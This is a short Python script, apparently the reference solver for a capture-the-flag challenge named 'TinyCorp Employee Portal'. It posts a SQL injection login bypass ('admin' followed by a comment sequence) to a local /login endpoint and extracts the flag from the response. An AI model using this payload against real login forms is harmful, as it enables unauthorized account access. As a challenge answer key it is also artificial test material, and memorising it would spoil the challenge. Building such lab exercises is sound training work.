#!/usr/bin/env python3
"""
Reference solver / verifier for TinyCorp Employee Portal.
Usage: python3 solve.py [base_url]   (default: http://127.0.0.1:5000)
Requires: requests (pip install requests)
"""
import re
import sys

import requests

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"


def main():
    session = requests.Session()
    payload = {"username": "admin' -- ", "password": "anything"}
    r = session.post(f"{BASE_URL}/login", data=payload)

    match = re.search(r"FLAG\{[^}]+\}", r.text)
    if not match:
        print("[-] No flag found — exploit did not work.")
        sys.exit(1)

    print(f"[+] SQL injection payload: username={payload['username']!r}")
    print(f"[+] FLAG: {match.group(0)}")


if __name__ == "__main__":
    main()
